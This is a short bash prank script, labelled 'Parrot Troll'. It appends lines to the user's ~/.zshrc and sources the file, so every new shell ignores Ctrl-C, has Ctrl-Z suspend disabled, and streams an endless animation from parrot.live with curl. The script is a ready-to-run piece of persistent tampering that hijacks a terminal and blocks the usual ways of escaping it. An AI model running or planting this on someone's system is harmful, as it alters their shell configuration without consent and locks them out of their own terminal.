#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
		echo "$PARROT_TROLL" >> "$file"
		echo "Parrot Troll 🦜 added to $file"
    fi
}

append_parrot_troll ~/.zshrc
source ~/.zshrc
